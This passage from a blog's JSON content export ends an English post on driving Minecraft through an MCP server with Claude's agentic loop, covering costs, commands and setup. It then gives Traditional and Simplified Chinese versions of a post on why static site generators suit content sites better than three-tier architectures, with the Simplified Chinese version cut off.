Context updated: Foundation complete --- Agentic Loop Iteration #2 --- 🧠 Inference: &quot;Is build complete? No. Plan: Build walls on foundation to form structure&quot; ⚡ Execute MCP: place-block x200 📊 Context updated: Walls complete --- Agentic Loop Iteration #3 --- 🧠 Inference: &quot;Is build complete? No. Plan: Add glass pane windows to walls for authenticity&quot; ⚡ Execute MCP: place-block (glass_pane) x50 📊 Context updated: Windows complete --- Agentic Loop Iteration #4 --- 🧠 Inference: &quot;Is build complete? No. Plan: Construct roof with stairs to match White House style&quot; ⚡ Execute MCP: place-block (quartz_stairs) x150 📊 Context updated: Roof complete --- Agentic Loop Iteration #5 --- 🧠 Inference: &quot;Is build complete? No. Plan: Add decorative elements to enhance realism&quot; ⚡ Execute MCP: place-block (decorations) x30 📊 Context updated: Decorations complete --- Agentic Loop Iteration #6 --- 🧠 Inference: &quot;Is build complete? Yes! All elements present.&quot; 🛑 Stop loop - No MCP commands executed MCP Tool Calls (collapsed in UI, but happening): ▶ get-position Result: &#123;x: 100, y: 64, z: -60&#125; ▶ place-block (quartz, foundation) ▶ place-block (quartz, foundation) ▶ place-block (quartz, foundation) ... (hundreds of blocks) ▶ place-block (glass_pane, windows) ▶ place-block (glass_pane, windows) ... (more windows) ▶ place-block (quartz_stairs, roof) ... (roof construction) ▶ place-block (decorations) ... (final touches) Claude’s Response (what you see): I can see this is an image of the White House. I&#39;ll build a simplified version in Minecraft. Let me start by creating the foundation and main structure. [Builds automatically] I&#39;ve completed the White House with: - Main structure with quartz blocks - Decorative columns - Window frames and headers - Multi-level dome cupola on roof - Landscaping with trees and gardens Key Point: You don’t manually say “add windows” or “make it taller.” Claude’s agentic loop autonomously: Checks if the goal is complete Decides what to build next Executes MCP commands Updates its context Repeats until it determines the build is complete Stops automatically (no more MCP commands) Cost Breakdown Example: 1 vision analysis: $0.02 50 agentic loop iterations: $2.00 ← This is the expensive part! - Each iteration &#x3D; 1 inference (&quot;what next?&quot; + &quot;done?&quot;) - 50 iterations &#x3D; 50 inferences &#x3D; $$$ 1000+ MCP command executions: $0.00 (local Minecraft server) ───────────────────────────────────── Total: ~$2.02 for a complex White House build Note: The loop stops when inference determines &quot;build complete&quot; That final inference costs money but executes no MCP commands Final Result: 💰 Cost Consideration: It's the Thinking, Not the CommandsWhere the cost comes from: Vision API: ~$0.01-0.05 (one-time to analyze image) Agentic Loop Iterations: This is where costs add up! 💸 Each iteration = 1 LLM inference Each inference asks: &quot;Am I done? If not, what's next?&quot; Complex builds = many iterations Example: White House might need 50-100 iterations Each iteration costs based on tokens processed Final iteration: Determines &quot;done&quot; but executes no MCP commands (still costs money) MCP commands themselves: Nearly free (just API calls to local Minecraft) The expensive part is Claude's brain, not its hands: Iteration #1: &quot;Not done. Plan: Place foundation blocks to create base&quot; → executes 100 place-block commands Iteration #2: &quot;Not done. Plan: Build walls on foundation to form structure&quot; → executes 200 place-block commands Iteration #3: &quot;Not done. Plan: Add windows to walls for authenticity&quot; → executes 50 place-block commands Iteration #50: &quot;Done! All elements complete. Stop.&quot; → executes 0 commands (but inference still costs) Each iteration = LLM processing = $$$ Tips to manage costs: Use Claude Desktop free tier for testing (has limits) Start small: &quot;Build a simple house&quot; (fewer iterations) Complex builds = more iterations = higher cost The White House example might cost $1-5 depending on detail level Available Commands You Can Use: Movement &amp; Navigation: get-position - Where am I? move-to-position - Go to coordinates look-at - Look at specific location jump - Jump move-in-direction - Move forward/backward for X seconds fly-to - Fly directly to coordinates (creative mode) Inventory Management: list-inventory - What do I have? find-item - Where’s my diamond pickaxe? equip-item - Equip sword Block Interaction: place-block - Place block at coordinates dig-block - Mine block at coordinates get-block-info - What block is this? find-block - Find nearest diamond ore Entity Interaction: find-entity - Find nearest zombie/villager/cow Communication: send-chat - Send message in-game read-chat - Read recent player messages Game State: detect-gamemode - Am I in survival or creative? Example Conversations: You: &quot;Find the nearest oak tree and chop it down&quot; Claude: *uses find-block, moves to tree, digs blocks* You: &quot;Build a 5x5 cobblestone platform at my current position&quot; Claude: *calculates positions, places 25 blocks* You: &quot;Check if there are any creepers nearby&quot; Claude: *uses find-entity, reports results* You: &quot;Fly to coordinates 100, 64, 200&quot; Claude: *uses fly-to command* Why This is Revolutionary: Image-to-build: Show a picture, get a structure (vision used once) Agentic autonomy: Claude decides all steps without human intervention Self-terminating: Knows when the job is done and stops automatically Natural language: No command syntax to memorize Intelligent planning: Breaks complex builds into logical steps Context-aware: Remembers what it built in previous iterations Adaptive: Handles unexpected situations (out of materials? Goes to get more) Educational: See how agentic AI breaks down complex tasks Real-time feedback: See changes happen in-game as Claude works Other MCP Gaming Possibilities Strategy Games: “Scout the map and report enemy positions” “Build optimal base layout for defense” Sandbox Games: “Create a redstone calculator” “Design a railway system connecting all villages” Automation Games (Factorio, Satisfactory): “Optimize my production line” “Calculate resource requirements for 1000 circuits/min” 💡 The Learning AngleAgentic AI + MCP game automation is actually educational: Learn programming concepts without code Understand agentic AI loops and decision-making See how AI maintains context across iterations Practice problem decomposition Understand when to stop (goal completion detection) See algorithms in action Setting Up Minecraft MCP Server Requirements: Minecraft Java Edition Claude Desktop (free) Minecraft MCP Server Node.js installed Quick Setup: Install the MCP server: git clone https:&#x2F;&#x2F;github.com&#x2F;yuniko-software&#x2F;minecraft-mcp-server cd minecraft-mcp-server npm install Configure Claude Desktop: Add the MCP server to Claude’s config file Launch Minecraft: Start a world (creative mode recommended for testing) Start the MCP server: npm start Talk to Claude: Open Claude Desktop and start giving Minecraft commands! Your First Command: You: &quot;What&#39;s my current position in Minecraft?&quot; Claude: *uses get-position command* &quot;You&#39;re at coordinates X: 245, Y: 64, Z: -128&quot; You: &quot;Build a small house here&quot; Claude: *starts placing blocks automatically* The magic happens behind the scenes—Claude translates your natural language into MCP commands, executes them, and reports back in plain English. 🎯 The Bottom Line: Automate Responsibly Do: Automate single-player experiences Use automation to learn programming/AI Experiment in sandbox environments Respect game developers’ rules Don’t: Bot in competitive online games Sell botted accounts or items Ruin other players’ experiences Ignore Terms of Service The Philosophy: Automation should enhance your gaming, not replace it. Use bots to skip the boring parts, but keep the fun parts for yourself. If you’re automating everything, ask yourself: are you even playing anymore? 🎮 Final ThoughtThe best automation is the kind that gives you more time to enjoy what you love about gaming—whether that's epic boss fights, creative building, or just hanging with friends online. Resources to Explore Minecraft MCP Server: The project that makes AI-controlled Minecraft possible Claude Desktop: Free AI assistant with MCP support MCP Documentation: Learn about Model Context Protocol Android Automation: Tasker, MacroDroid (legal automation tools) Game Modding Communities: Learn what’s allowed in your favorite games Remember: with great automation comes great responsibility. Game smart, stay legal, and most importantly—have fun! 🚀","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"},{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"},{"name":"MCP","slug":"MCP","permalink":"https://neo01.com/tags/MCP/"},{"name":"Agentic AI","slug":"Agentic-AI","permalink":"https://neo01.com/tags/Agentic-AI/"},{"name":"Gaming","slug":"Gaming","permalink":"https://neo01.com/tags/Gaming/"}]},{"title":"靜態網站產生器 - 為什麼簡單在現代網頁開發中勝過複雜","slug":"2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development-zh-TW","date":"un66fin66","updated":"un00fin00","comments":true,"path":"/zh-TW/2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development/","permalink":"https://neo01.com/zh-TW/2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development/","excerpt":"三層架構對你的部落格來說是過度的嗎?探索靜態網站產生器如何提供更好的效能、安全性和零成本託管。","text":"在網頁開發的世界中，有一個持續存在的信念：更多的複雜性等於更多的能力。幾十年來，三層架構——展示層、應用層和資料庫層——一直是建構動態網站的黃金標準。但如果我告訴你，對於許多使用案例，特別是以內容為重點的網站，這種方法是過度的呢？ 靜態網站產生器（SSG）正在挑戰現狀，而且有充分的理由。它們代表了從「按需產生」到「產生一次，服務多次」的範式轉變。這個簡單的改變對效能、安全性、成本和開發者體驗有深遠的影響。 三層陷阱 傳統的三層架構很強大。它們允許動態內容產生、使用者認證、即時資料處理和複雜的業務邏輯。但這種力量是有代價的： 效能瓶頸：每個頁面請求都會觸發資料庫查詢、範本渲染和應用邏輯執行。即使有快取，也有開銷。 安全漏洞：更多的移動部件意味著更多的攻擊面。SQL 注入、認證繞過和伺服器端漏洞是持續的擔憂。 基礎設施複雜性：你需要網頁伺服器、應用伺服器、資料庫伺服器、負載平衡器，通常還需要快取層。每個元件都需要配置、監控和維護。 擴展挑戰：處理流量高峰需要複雜的基礎設施、自動擴展群組，通常還需要大量的雲端成本。 昂貴的營運：運行 24/7 伺服器、資料庫實例和負載平衡器會迅速累積。一個適度的三層設定即使對於流量最少的簡單部落格也可能輕易花費每月 $50-200。加上監控、備份和冗餘，成本會倍增。 💰 重要的成本節省靜態託管可以將基礎設施成本從每月 $10-200 降低到 $0-10。對於個人部落格或小型企業網站，這每年節省 $600-2,400——這些錢更好地花在內容、行銷或你的下一杯咖啡上。 對於部落格、作品集、文件網站或行銷頁面——內容變化不頻繁的地方——這種複雜性是不必要的。你在維護一輛法拉利，而一輛自行車就足夠了。 回歸基礎，但更聰明 靜態網站並不新鮮——它們是網路的開始方式。但現代靜態網站產生器不僅僅是回歸手工編碼的 HTML。它們帶來了動態系統的開發者體驗，同時提供預先建構的 HTML、CSS 和 JavaScript 檔案。你獲得範本、內容管理和建置自動化，然後直接從 CDN 提供結果，無需伺服器端處理。 好處是令人信服的： 極快的速度：沒有資料庫查詢，沒有範本渲染，沒有應用邏輯。只是從靠近使用者的 CDN 邊緣位置提供的靜態檔案。載入時間以毫秒計，而不是秒。 堅不可摧的安全性：沒有伺服器端程式碼意味著沒有伺服器端漏洞。沒有資料庫可以駭入，沒有認證可以繞過。你的攻擊面縮小到幾乎為零。 輕鬆擴展：CDN 是為處理大量流量而建構的。無論你有 10 個訪客還是 1000 萬個訪客，你的網站表現都相同。不需要自動擴展配置。 最低成本：託管靜態檔案很便宜——通常是免費的。GitHub Pages、Netlify、Vercel 和 Cloudflare Pages 提供慷慨的免費方案。沒有資料庫託管，沒有應用伺服器，沒有負載平衡器。 轉移責任：讓你的託管提供商處理基礎設施、正常運行時間、DDoS 保護、SSL 憑證、CDN 分發和安全補丁。你專注於內容，而不是營運。 開發者體驗：用 Markdown 寫作，提交到 Git，並自動部署。版本控制成為你的 CMS。回滾就像還原提交一樣簡單。 權衡 靜態網站產生器並不完美。它們有自己的一套挑戰： 建置時間開銷：擁有數千頁的大型網站可能需要幾分鐘才能重建。每次內容變更都需要重新產生整個網站，這可能會減慢開發期間的反饋循環。 ⏱️ 建置時間考量擁有 10,000 頁以上的網站可能需要 5-10 分鐘才能重建。如果你每小時發布多次更新，這會成為瓶頸。選擇 Hugo 以獲得速度，或者如果你的產生器支援，考慮增量建置。 沒有即時更新：內容變更不是即時的。你需要重建和重新部署。如果你需要每隔幾分鐘更新內容，靜態產生會變得麻煩。 有限的動態功能：使用者認證、個人化內容和互動功能需要變通方法——客戶端 JavaScript、第三方服務或無伺服器函數。 以開發者為中心的工作流程：非技術內容創作者可能會在 Git、Markdown 和命令列工具上掙扎。除非你添加無頭 CMS，否則沒有友好的管理面板，這會增加複雜性。 👨💻 靜態網站產生僅適用於開發者非開發者可能會發現沒有技術知識的工作流程具有挑戰性 預覽挑戰：在發布前看到內容的外觀需要運行本地建置或使用預覽部署，不像動態 CMS 那樣變更立即可見。 這些挑戰是真實的，但對於以內容為重點的網站，它們通常是可接受的權衡，以換取獲得的好處。 💡 何時選擇靜態與動態選擇靜態如果：內容更新不頻繁（每天或更少）、沒有使用者產生的內容、效能和安全性是優先事項、預算有限。 選擇動態如果：需要即時更新、需要使用者認證、每個使用者的個人化內容、複雜的搜尋功能至關重要。 比較競爭者 靜態網站產生器生態系統充滿了選項。這裡是快速比較： 功能 Hexo Jekyll Hugo Gatsby 語言 Node.js Ruby Go React 建置速度 快 慢 非常快 中等 學習曲線 溫和 溫和 陡峭 陡峭 外掛生態系統 豐富 最大 較小 豐富 最適合 部落格 GitHub Pages 大型網站 互動網站 依賴 npm 套件 Ruby gems 單一二進位 npm + React 主題支援 廣泛 廣泛 良好 基於元件 預覽伺服器 優秀 良好 優秀 良好 Hexo 建立在 Node.js 上，Hexo 在部落格社群中特別受歡迎。它快速，有豐富的外掛生態系統，並支援多個範本引擎。學習曲線溫和，使其成為熟悉 JavaScript 的開發者的理想選擇。Hexo 的預覽伺服器具有即時重載功能，使開發順暢，主題快取優化建置效能。 想要在網站上添加 cookie 同意？使用外掛很容易： 📖 neoalienson/hexo-cookieconsent ⭐ 0 Stars 🍴 0 Forks Language: JavaScript 想要在網站上添加 QR 碼？ 📖 neoalienson/hexo-helper-qrcode-adv Advanced QR code helper for Hexo that generates QR codes for page sharing with extensive styling options using qr-code-styling. ⭐ 0 Stars 🍴 0 Forks Language: JavaScript 想要在網站上添加 GitHub 卡片？ 📖 neoalienson/hexo-github-card-inline Display a card with statistics for GitHub profile and repository in your hexo blog post. The card does not need external resources or services. ⭐ 0 Stars 🍴 0 Forks Language: JavaScript 最適合：個人部落格、文件網站、中等規模的內容密集網站。 Jekyll 原始的靜態網站產生器，使這個概念流行起來，Jekyll 用 Ruby 編寫，並支援 GitHub Pages。它成熟、穩定，並擁有最大的主題和外掛生態系統。原生 GitHub Pages 整合意味著零配置部署。 最適合：GitHub 託管的網站、希望獲得最大社群支援和主題的專案。 Hugo 用 Go 編寫，Hugo 是靜態網站產生器的速度惡魔。它可以在幾秒鐘內建置數千頁。它是一個沒有依賴的單一二進位檔案，使安裝變得微不足道。Hugo 在內容組織和分類法方面表現出色。 最適合：大規模網站、文件、需要快速建置時間的網站。 Gatsby 建立在 React 上，Gatsby 橋接靜態和動態世界。它產生靜態頁面，但將它們水合成完整的 React 應用程式，在載入後啟用動態功能。它對於需要一些互動性和現代 JavaScript 工具的網站特別強大。 最適合：行銷網站、作品集、需要漸進式網頁應用功能和 React 整合的網站。 當靜態不夠時 靜態網站產生器不是萬能的。它們在以內容為重點的網站上表現出色，但在某些使用案例上掙扎： 使用者產生的內容：如果使用者需要發布評論、上傳檔案或建立帳戶，你需要後端服務。（儘管你可以整合第三方服務，如 Disqus 或 Auth0。） 即時資料：股票價格、即時體育比分或社交媒體動態需要動態更新。（儘管你可以使用客戶端 JavaScript 來獲取這些資料。） 個人化：根據使用者的個人資料向不同使用者顯示不同內容需要伺服器端邏輯。（儘管邊緣運算和客戶端個人化是新興的解決方案。） 複雜搜尋：在大型內容庫中進行全文搜尋對於純靜態網站來說具有挑戰性。（儘管像 Algolia 這樣的服務可以填補這個空白。） 做出選擇 問題不是靜態網站產生器是否比傳統架構更好——而是它們是否更適合你的特定使用案例。如果你正在建構部落格、作品集、文件網站或行銷頁面，靜態產生提供了令人信服的優勢：更好的效能、更強的安全性、更低的成本和更簡單的營運。 三層架構並沒有過時——它只是並不總是必要的。有時簡單真的勝過複雜。有時自行車比法拉利更快，特別是當你只是去街角商店時。 從簡單開始。選擇一個符合你技術背景的靜態網站產生器。部署到免費託管平台。專注於創建優質內容，而不是管理基礎設施。如果需要，你總是可以稍後添加複雜性。 未來不是在靜態和動態之間選擇——而是為應用程式的每個部分使用正確的工具。 做出選擇 對於以內容為重點的網站——部落格、文件、作品集、行銷網站——靜態網站產生器通常是更優越的選擇。它們比三層架構更快、更安全、更便宜、更簡單。 如果你正在開始一個新的部落格或內容網站，考慮這個：你真的需要資料庫嗎？你真的需要在每個請求上進行伺服器端渲染嗎？或者預先建構你的網站並提供靜態檔案會給你所需的一切，而複雜性只是一小部分？ 答案，通常情況下，是簡單勝過複雜。靜態網站產生器證明，有時最好的解決方案是做得更少，而不是更多。 隨著網頁開發的持續發展，趨勢很明確：將複雜性推到建置時間，而不是運行時間。產生一次，無限服務。你的使用者——和你的基礎設施帳單——會感謝你。 實踐我們所宣揚的 - 這個部落格 你現在正在閱讀的這個部落格？它是用 Hexo 建構的，並託管在 GitHub Pages 上。整個營運每月花費正好 $0。 每篇文章都用 Markdown 寫作，提交到 Git 儲存庫，並通過 GitHub Actions 自動建置和部署。沒有伺服器需要維護，沒有資料庫需要備份，沒有安全補丁需要應用。GitHub 處理託管、CDN 分發、SSL 憑證和正常運行時間監控。 我轉移給 GitHub Pages 的責任包括基礎設施管理、DDoS 保護、全球內容交付和 99.9% 的正常運行時間保證。我專注的是寫作內容和偶爾調整主題。 如果這個部落格突然爆紅並在明天收到一百萬訪客，什麼都不會壞，帳單仍然是 $0。這就是靜態網站產生的力量——以及為什麼很難為以內容為重點的網站證明任何更複雜的東西。 實踐中的設計原則 這個部落格圍繞六個核心原則進行架構，靜態網站方法在所有這些原則上都實現了： 安全性：沒有伺服器端程式碼，沒有資料庫，沒有認證層。攻擊面最小。GitHub Pages 自動處理 SSL/TLS。沒有漏洞需要修補，沒有漏洞需要擔心。 最少的第三方依賴：網站不載入外部 JavaScript 函式庫，除了可選的 SaaS 整合。核心功能所需的一切都在建置時捆綁。這減少了隱私問題，提高了效能，並消除了對關鍵功能的外部服務的依賴。 零成本：GitHub Pages 託管是免費的。沒有伺服器帳單，沒有資料庫成本，沒有 CDN 費用。唯一的投資是時間。 高可用性：GitHub Pages 提供 99.9% 的正常運行時間 SLA。內容通過 CDN 全球分發。沒有單點故障。沒有維護窗口。 效能：從 CDN 邊緣位置提供的靜態檔案。沒有資料庫查詢，沒有伺服器端渲染。頁面在毫秒內載入。Hexo 的主題快取優化建置時間，保持開發反饋循環快速。 響應式設計：主題適應所有螢幕尺寸。靜態網站在響應式設計方面表現出色，因為不需要伺服器端裝置檢測——CSS 媒體查詢在客戶端處理一切。 應對挑戰 這個部落格如何處理典型的靜態網站挑戰？ 預覽：Hexo 的內建伺服器（hexo server）提供即時本地預覽和即時重載。開發期間的變更立即出現。對於生產預覽，GitHub Actions 可以部署到暫存分支。 建置速度：Hexo 針對速度進行了優化。主題快取和增量建置使典型更新的產生時間保持在幾秒鐘內。即使完整重建也能快速完成。 即時更新：對於像 GitHub 儲存庫統計這樣的動態資料，排程建置會自動運行。GitHub Actions 每天觸發重建，獲取新資料並重新產生頁面。這不是即時的，但對於部落格來說，每天更新就足夠了。 內容工作流程：用 Markdown 和 Git 版本控制寫作實際上是一個優勢。每個變更都被追蹤，分支啟用草稿工作流程，回滾很簡單。「限制」變成了一個功能。 SaaS 彈性：像評論和分析這樣的可選服務是非同步載入的。如果它們無法載入或變得不可用，核心部落格內容保持不受影響。這種優雅的降級確保網站的主要目的——提供內容——永遠不依賴第三方服務的可用性。 可選的 SaaS 整合 部落格利用 SaaS 提供商提供非關鍵功能，在核心功能和可選增強之間保持清晰的分離： 評論系統：第三方 SaaS 處理所有評論功能。部落格不負責運行或維護評論基礎設施。如果服務失敗或停止，部落格繼續完美運作——讀者只是不能留下評論。該功能可以隨時停用，無需程式碼變更。 📖 neoalienson/hexo-plugin-commentbox A Hexo plugin to use commentbox.io ⭐ 1 Stars 🍴 0 Forks Language: JavaScript 分析：Google Analytics 追蹤訪客行為和流量模式。如果 Google Analytics 停機或被廣告攔截器攔截，網站正常運作。分析純粹是觀察性的——它提供見解，但不是提供內容所必需的。部落格獨立於是否收集分析資料而運作。 結果是一個快速、安全、免費且幾乎不需要營運開銷的部落格。它證明了對於以內容為重點的網站，靜態產生不僅僅是可行的——它通常是最好的選擇。","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"}],"lang":"zh-TW"},{"title":"静态网站生成器 - 为什么简单在现代网页开发中胜过复杂","slug":"2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development-zh-CN","date":"un66fin66","updated":"un00fin00","comments":true,"path":"/zh-CN/2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development/","permalink":"https://neo01.com/zh-CN/2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development/","excerpt":"三层架构对你的博客来说是过度的吗?探索静态网站生成器如何提供更好的性能、安全性和零成本托管。","text":"在网页开发的世界中，有一个持续存在的信念：更多的复杂性等于更多的能力。几十年来，三层架构——展示层、应用层和数据库层——一直是构建动态网站的黄金标准。但如果我告诉你，对于许多使用案例，特别是以内容为重点的网站，这种方法是过度的呢？ 静态网站生成器（SSG）正在挑战现状，而且有充分的理由。它们代表了从&quot;按需生成&quot;到&quot;生成一次，服务多次&quot;的范式转变。这个简单的改变对性能、安全性、成本和开发者体验有深远的影响。 三层陷阱 传统的三层架构很强大。它们允许动态内容生成、用户认证、实时数据处理和复杂的业务逻辑。但这种力量是有代价的： 性能瓶颈：每个页面请求都会触发数据库查询、模板渲染和应用逻辑执行。即使有缓存，也有开销。 安全漏洞：更多的移动部件意味着更多的攻击面。SQL 注入、认证绕过和服务器端漏洞是持续的担忧。 基础设施复杂性：你需要网页服务器、应用服务器、数据库服务器、负载均衡器，通常还需要缓存层。每个组件都需要配置、监控和维护。 扩展挑战：处理流量高峰需要复杂的基础设施、自动扩展组，通常还需要大量的云端成本。 昂贵的运营：运行 24/7 服务器、数据库实例和负载均衡器会迅速累积。一个适度的三层设置即使对于流量最少的简单博客也可能轻易花费每月 $50-200。加上监控、备份和冗余，成本会倍增。 💰 重要的成本节省静态托管可以将基础设施成本从每月 $10-200 降低到 $0-10。对于个人博客或小型企业网站，这每年节省 $600-2,400——这些钱更好地花在内容、营销或你的下一杯咖啡上。 对于博客、作品集、文档网站或营销页面——内容变化不频繁的地方——这种复杂性是不必要的。你在维护一辆法拉利，而一辆自行车就足够了。 回归基础，但更聪明 静态网站并不新鲜——它们是网络的开始方式。但现代静态网站生成器不仅仅是回归手工编码的 HTML。它们带来了动态系统的开发者体验，同时提供预先构建的 HTML、CSS 和 JavaScript 文件。你获得模板、内容管理和构建自动化，然后直接从 CDN 提供结果，无需服务器端处理。 好处是令人信服的： 极快的速度：没有数据库查询，没有模板渲染，没有应用逻辑。只是从靠近用户的 CDN 边缘位置提供的静态文件。加载时间以毫秒计，而不是秒。 坚不可摧的安全性：没有服务器端代码意味着没有服务器端漏洞。没有数据库可以黑入，没有认证可以绕过。你的攻击面缩小到几乎为零。 轻松扩展：CDN 是为处理大量流量而构建的。无论你有 10 个访客还是 1000 万个访客，你的网站表现都相同。不需要自动扩展配置。 最低成本：托管静态文件很便宜——通常是免费的。GitHub Pages、Netlify、Vercel 和 Cloudflare Pages 提供慷慨的免费方案。没有数据库托管，没有应用服务器，没有负载均衡器。 转移责任：让你的托管提供商处理基础设施、正常运行时间、DDoS 保护、SSL 证书、CDN 分发和安全补丁。你专注于内容，而不是运营。 开发者体验：用 Markdown 写作，提交到 Git，并自动部署。版本控制成为你的 CMS。回滚就像还原提交一样简单。 权衡 静态网站生成器并不完美。它们有自己的一套挑战： 构建时间开销：拥有数千页的大型网站可能需要几分钟才能重建。每次内容变更都需要重新生成整个网站，这可能会减慢开发期间的反馈循环。 ⏱️ 构建时间考量拥有 10,000 页以上的网站可能需要 5-10 分钟才能重建。如果你每小时发布多次更新，这会成为瓶颈。选择 Hugo 以获得速度，或者如果你的生成器支持，考虑增量构建。 没有实时更新：内容变更不是即时的。你需要重建和重新部署。如果你需要每隔几分钟更新内容，静态生成会变得麻烦。 有限的动态功能：用户认证、个性化内容和交互功能需要变通方法——客户端 JavaScript、第三方服务或无服务器函数。 以开发者为中心的工作流程：非技术内容创作者可能会在 Git、Markdown 和命令行工具上挣扎。除非你添加无头 CMS，否则没有友好的管理面板，这会增加复杂性。 👨💻 静态网站生成仅适用于开发者非开发者可能会发现没有技术知识的工作流程具有挑战性 预览挑战：在发布前看到内容的外观需要运行本地构建或使用预览部署，不像动态 CMS 那样变更立即可见。 这些挑战是真实的，但对于以内容为重点的网站，它们通常是可接受的权衡，以换取获得的好处。 💡 何时选择静态与动态选择静态如果：内容更新不频繁（每天或更少）、没有用户生成的内容、性能和安全性是优先事项、预算有限。 选择动态如果：需要实时更新、需要用户认证、每个用户的个性化内容、复杂的搜索功能至关重要。 比较竞争者 静态网站生成器生态系统充满了选项。这里是快速比较： 功能 Hexo Jekyll Hugo Gatsby 语言 Node.js Ruby Go React 构建速度 快 慢 非常快 中等 学习曲线 温和 温和 陡峭 陡峭 插件生态系统 丰富 最大 较小 丰富 最适合 博客 GitHub Pages 大型网站 交互网站 依赖 npm 包 Ruby gems 单一二进制 npm + React 主题支持 广泛 广泛 良好 基于组件 预览服务器 优秀 良好 优秀 良好 Hexo 建立在 Node.js 上，Hexo 在博客社区中特别受欢迎。它快速，有丰富的插件生态系统，并支持多个模板引擎。学习曲线温和，使其成为熟悉 JavaScript 的开发者的理想选择。Hexo 的预览服务器具有实时重载功能，使开发顺畅，主题缓存优化构建性能。 想要在网站上添加 cookie 同意？使用插件很容易： 📖 neoalienson/hexo-cookieconsent ⭐ 0 Stars 🍴 0 Forks Language: JavaScript 想要在网站上添加 QR 码？ 📖 neoalienson/hexo-helper-qrcode-adv Advanced QR code helper for Hexo that generates QR codes for page sharing with extensive styling options using qr-code-styling. ⭐ 0 Stars 🍴 0 Forks Language: JavaScript 想要在网站上添加 GitHub 卡片？ 📖 neoalienson/hexo-github-card-inline Display a card with statistics for GitHub profile and repository in your hexo blog post. The card does not need external resources or services. ⭐ 0 Stars 🍴 0 Forks Language: JavaScript 最适合：个人博客、文档网站、中等规模的内容密集网站。 Jekyll 原始的静态网站生成器，使这个概念流行起来，Jekyll 用 Ruby 编写，并支持 GitHub Pages。它成熟、稳定，并拥有最大的主题和插件生态系统。原生 GitHub Pages 集成意味着零配置部署。 最适合：GitHub 托管的网站、希望获得最大社区支持和主题的项目。 Hugo 用 Go 编写，Hugo 是静态网站生成器的速度恶魔。它可以在几秒钟内构建数千页。它是一个没有依赖的单一二进制文件，使安装变得微不足道。Hugo 在内容组织和分类法方面表现出色。 最适合：大规模网站、文档、需要快速构建时间的网站。 Gatsby 建立在 React 上，Gatsby 桥接静态和动态世界。它生成静态页面，但将它们水合成完整的 React 应用程序，在加载后启用动态功能。它对于需要一些交互性和现代 JavaScript 工具的网站特别强大。 最适合：营销网站、作品集、需要渐进式网页应用功能和 React 集成的网站。 当静态不够时 静态网站生成器不是万能的。它们在以内容为重点的网站上表现出色，但在某些使用案例上挣扎： 用户生成的内容：如果用户需要发布评论、上传文件或创建账户，你需要后端服务。（尽管你可以集成第三方服务，如 Disqus 或 Auth0。） 实时数据：股票价格、实时体育比分或社交媒体动态需要动态更新。（尽管你可以使用客户端 JavaScript 来获取这些数据。） 个性化：根据用户的个人资料向不同用户显示不同内容需要服务器端逻辑。（尽管边缘计算和客户端个性化是新兴的解决方案。） 复杂搜索：在大型内容库中进行全文搜索对于纯静态网站来说具有挑战性。（尽管像 Algolia 这样的服务可以填补这个空白。） 做出选择 问题不是静态网站生成器是否比传统架构更好——而是它们是否更适合你的特定使用案例。如果你正在构建博客、作品集、文档网站或营销页面，静态生成提供了令人信服的优势：更好的性能、更强的安全性、更低的成本和更简单的运营。 三层架构并没有过时——它只是并不总是必要的。有时简单真的胜过复杂。有时自行车比法拉利更快，特别是当你只是去街角商店时。 从简单开始。选择一个符合你技术背景的静态网站生成器。部署到免费托管平台。专注于创建优质内容，而不是管理基础设施。如果需要，你总是可以稍后添加复杂性。 未来不是在静态和动态之间选择——而是为应用程序的每个部分使用正确的工具。 做出选择 对于以内容为重点的网站——博客、文档、作品集、营销网站——静态网站生成器通常是更优越的选择。它们比三层架构更快、更安全、更便宜、更简单。 如果你正在开始一个新的博客或内容网站，考虑这个：你真的需要数据库吗？你真的需要在每个请求上进行服务器端渲染吗？或者预先构建你的网站并提供静态文件会给你所需的一切，而复杂性只是一小部分？ 答案，通常情况下，是简单胜过复杂。静态网站生成器证明，有时最好的解决方案是做得更少，而不是更多。 随着网页开发的持续发展，趋势很明确：将复杂性推到构建时间，而不是运行时间。生成一次，无限服务。你的用户——和你的基础设施账单——会感谢你。 实践我们所宣扬的 - 这个博客 你现在正在阅读的这个博客？它是用 Hexo 构建的，并托管在 GitHub Pages 上。整个运营每月花费正好 $0。 每篇文章都用 Markdown 写作，提交到 Git 仓库，并通过 GitHub Actions 自动构建和部署。没有服务器需要维护，没有数据库需要备份，没有安全补丁需要应用。GitHub 处理托管、CDN 分发、SSL 证书和正常运行时间监控。 我转移给 GitHub Pages 的责任包括基础设施管理、DDoS 保护、全球内容交付和 99.9% 的正常运行时间保证。我专注的是写作内容和偶尔调整主题。 如果这个博客突然爆红并在明天收到一百万访客，什么都不会坏，账单仍然是 $0。这就是静态网站生成的力量——以及为什么很难为以内容为重点的网站证明任何更复杂的东西。 实践中的设计原则 这个博客围绕六个核心原则进行架构，静态网站方法在所有这些原则上都实现了： 安全性：没有服务器端代码，没有数据库，没有认证层。攻击面最小。GitHub Pages 自动处理 SSL/TLS。没有漏洞需要修补，没有漏洞需要担心。 最少的第三方依赖：网站不加载外部 JavaScript 库，除了可选的 SaaS 集成。核心功能所需的一切都在构建时捆绑。这减少了隐私问题，提高了性能，并消除了对关键功能的外部服务的依赖。 零成本：GitHub Pages 托管是免费的。没有服务器账单，没有数据库成本，没有 CDN 费用。唯一的投资是时间。 高可用性：GitHub Pages 提供 99.9% 的正常运行时间 SLA。内容通过 CDN 全球分发。没有单点故障。没有维护窗口。 性能：从 CDN 边缘位置提供的静态文件。没有数据库查询，没有服务器端渲染。页面在毫秒内加载。Hexo 的主题缓存优化构建时间，保持开发反馈循环快速。 